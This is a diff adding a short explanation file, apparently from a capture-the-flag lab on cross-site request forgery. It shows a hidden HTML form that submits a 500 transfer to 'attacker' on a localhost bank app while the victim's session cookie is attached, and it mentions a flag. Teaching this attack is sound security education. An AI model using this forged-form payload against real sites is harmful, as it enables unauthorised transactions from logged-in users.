@@ -1,0 +1,11 @@
+The attacker's page contains a hidden form that automatically submits when you click the button:
+
+<form action="http://localhost:3003/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="500">
+</form>
+
+Because alice is logged in, her browser includes her session cookie with this request.
+The bank can't tell the difference between a legitimate request from alice and this forged request.
+
+After clicking the button, return to http://localhost:3003 to see the flag.
